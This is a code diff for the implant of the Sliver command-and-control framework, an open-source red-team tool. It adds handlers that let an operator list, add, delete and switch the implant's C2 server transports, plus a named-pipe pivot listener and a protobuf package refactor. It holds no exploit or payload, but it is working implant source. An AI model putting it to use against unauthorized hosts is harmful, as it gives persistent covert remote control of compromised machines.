@@ -22,11 +22,14 @@ import (
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
+
+	"net/url"
 	"time"
 
 	"github.com/golang/protobuf/proto"
 
 	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/commpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/comm"
 	"github.com/bishopfox/sliver/sliver/transports"
@@ -38,11 +41,179 @@ var commHandlers = map[uint32]CommHandler{
 
 	sliverpb.MsgHandlerStartReq: startHandler,
 	sliverpb.MsgHandlerCloseReq: closeHandler,
+
+	sliverpb.MsgTransportsReq:      transportsHandler,
+	sliverpb.MsgAddTransportReq:    addTransportHandler,
+	sliverpb.MsgDeleteTransportReq: deleteTransportHandler,
+	sliverpb.MsgSwitchTransportReq: transportSwitchHandler,
 }
 
 // GetCommHandlers - Returns a map of route handlers
 func GetCommHandlers() map[uint32]CommHandler {
 	return commHandlers
+}
+
+// Transports -------------------------------------------------------------------------------------------
+
+func transportsHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	req := &commpb.TransportsReq{}
+	proto.Unmarshal(envelope.Data, req)
+	res := &commpb.Transports{Response: &commonpb.Response{}}
+
+	for _, tp := range transports.Transports.Available {
+		res.Available = append(res.Available, &commpb.TransportC2{ID: tp.ID, URL: tp.URL.String()})
+	}
+
+	// Response
+	data, _ := proto.Marshal(res)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
+}
+
+func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	req := &commpb.TransportAddReq{}
+	proto.Unmarshal(envelope.Data, req)
+	res := &commpb.TransportAdd{Response: &commonpb.Response{}}
+
+	addr, err := url.Parse(req.URL)
+	if addr == nil || err != nil {
+		res.Success = false
+		res.Response.Err = "failed to parse transport URL"
+		data, _ := proto.Marshal(res)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+		return
+	}
+
+	// Instantiate the transport.
+	tp, err := transports.NewTransport(addr)
+	if err != nil {
+		res.Success = false
+		res.Response.Err = err.Error()
+		data, _ := proto.Marshal(res)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+		return
+	}
+
+	// Add to available transports
+	transports.Transports.Add(tp)
+	res.Success = true
+
+	// Response
+	data, _ := proto.Marshal(res)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
+}
+
+func deleteTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	req := &commpb.TransportDeleteReq{}
+	proto.Unmarshal(envelope.Data, req)
+	res := &commpb.TransportDelete{Response: &commonpb.Response{}}
+
+	transports.Transports.Remove(req.ID)
+	res.Success = true
+
+	// Response
+	data, _ := proto.Marshal(res)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
+}
+
+func transportSwitchHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	req := &commpb.TransportSwitchReq{}
+	proto.Unmarshal(envelope.Data, req)
+	res := &commpb.TransportSwitch{Response: &commonpb.Response{}}
+
+	// Get the transport for the ID, if not 0, and switch to it found
+	if req.ID != 0 {
+		tp := transports.Transports.Get(req.ID)
+		if tp == nil {
+			data, _ := proto.Marshal(res)
+			connection.Send <- &sliverpb.Envelope{
+				ID:   envelope.GetID(),
+				Data: data,
+			}
+			return
+		}
+
+		// Send the response before doing the switch
+		res.Success = true
+		data, _ := proto.Marshal(res)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+
+		// Wait a little to be sure the response has been sent.
+		time.Sleep(500 * time.Millisecond)
+
+		err := transports.Transports.Switch(tp.ID)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Transport switch error: %s", err.Error())
+			// {{end}}
+		}
+	}
+
+	// Parse the URL if any, and add transport
+	if req.ID == 0 && req.URL != "" {
+		addr, err := url.Parse(req.URL)
+		if addr == nil || err != nil {
+			res.Success = false
+			res.Response.Err = "failed to parse transport URL"
+			data, _ := proto.Marshal(res)
+			connection.Send <- &sliverpb.Envelope{
+				ID:   envelope.GetID(),
+				Data: data,
+			}
+			return
+		}
+
+		// Instantiate the transport.
+		tp, err := transports.NewTransport(addr)
+		if err != nil {
+			res.Success = false
+			res.Response.Err = err.Error()
+			data, _ := proto.Marshal(res)
+			connection.Send <- &sliverpb.Envelope{
+				ID:   envelope.GetID(),
+				Data: data,
+			}
+			return
+		}
+
+		// Add to available transports
+		transports.Transports.Add(tp)
+
+		// Switch with the new
+		res.Success = true
+		data, _ := proto.Marshal(res)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+
+		// Wait a little to be sure the response has been sent.
+		time.Sleep(500 * time.Millisecond)
+
+		err = transports.Transports.Switch(tp.ID)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Transport switch error: %s", err.Error())
+			// {{end}}
+		}
+	}
 }
 
 // Comm Handlers ----------------------------------------------------------------------------------------
@@ -51,7 +222,7 @@ func GetCommHandlers() map[uint32]CommHandler {
 // and gives this tunnel ID to the current active Transport. The latter passes it down to the Comm
 // system, which creates the tunnel and uses it as a net.Conn for speaking with the C2 server/pivot.
 func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	data := &sliverpb.CommTunnelOpenReq{}
+	data := &commpb.TunnelOpenReq{}
 	proto.Unmarshal(envelope.Data, data)
 
 	// {{if .Config.Debug}}
@@ -68,7 +239,7 @@ func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	// to end this handler, (otherwise it blocks and the tunnel will stay dry)
 	go comm.InitClient(tunnel, key)
 
-	muxResp, _ := proto.Marshal(&sliverpb.CommTunnelOpen{
+	muxResp, _ := proto.Marshal(&commpb.TunnelOpen{
 		Success:  true,
 		Response: &commonpb.Response{},
 	})
@@ -81,7 +252,7 @@ func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 // commTunnelDataHandler - Receives tunnel data over the implant's connection (in case the stack used is custom DNS/HTTPS),
 // and passes it down to the appropriate Comm tunnel. Will be written to its buffer, then consumed by the Comm's SSH layer.
 func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	data := &sliverpb.CommTunnelData{}
+	data := &commpb.TunnelData{}
 	proto.Unmarshal(envelope.Data, data)
 	tunnel := comm.Tunnels.Tunnel(data.TunnelID)
 	for {
@@ -110,7 +281,7 @@ func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.C
 func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 
 	// Request / Response
-	handlerReq := &sliverpb.HandlerStartReq{}
+	handlerReq := &commpb.HandlerStartReq{}
 	err := proto.Unmarshal(envelope.Data, handlerReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -118,12 +289,30 @@ func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection
 		// {{end}}
 		return
 	}
-	handlerRes := &sliverpb.HandlerStart{Response: &commonpb.Response{}}
+	handlerRes := &commpb.HandlerStart{Response: &commonpb.Response{}}
 
-	// Swith on transport protocol
+	// The application-layer protocol prevails over the trasport protocol
+	switch handlerReq.Handler.Application {
+	// Named pipes
+	case commpb.Application_NamedPipe:
+		// {{if .Config.NamePipec2Enabled}}
+		_, err := comm.ListenNamedPipe(handlerReq.Handler) // Adds the listener to the jobs.
+		if err != nil {
+			handlerRes.Success = false
+			handlerRes.Response.Err = err.Error()
+			break
+		}
+		handlerRes.Success = true
+		// {{end}} -NamePipec2Enabled
+	default:
+		goto TRANSPORT
+	}
+
+	// Fallback on the transport protocol
+TRANSPORT:
 	switch handlerReq.Handler.Transport {
 	// TCP
-	case sliverpb.TransportProtocol_TCP:
+	case commpb.Transport_TCP:
 		_, err := comm.ListenTCP(handlerReq.Handler) // Adds the listener to the jobs.
 		if err != nil {
 			handlerRes.Success = false
@@ -133,7 +322,7 @@ func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection
 		handlerRes.Success = true
 
 	// UDP
-	case sliverpb.TransportProtocol_UDP:
+	case commpb.Transport_UDP:
 		err := comm.ListenUDP(handlerReq.Handler) // Adds the lsitener to the jobs.
 		if err != nil {
 			handlerRes.Success = false
@@ -157,7 +346,7 @@ func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection
 func closeHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 
 	// Request / Response
-	handlerReq := &sliverpb.HandlerCloseReq{}
+	handlerReq := &commpb.HandlerCloseReq{}
 	err := proto.Unmarshal(envelope.Data, handlerReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -165,7 +354,7 @@ func closeHandler(envelope *sliverpb.Envelope, connection *transports.Connection
 		// {{end}}
 		return
 	}
-	handlerRes := &sliverpb.HandlerClose{Response: &commonpb.Response{}}
+	handlerRes := &commpb.HandlerClose{Response: &commonpb.Response{}}
 
 	// Call job stop
 	err = comm.Listeners.Remove(handlerReq.Handler.ID)
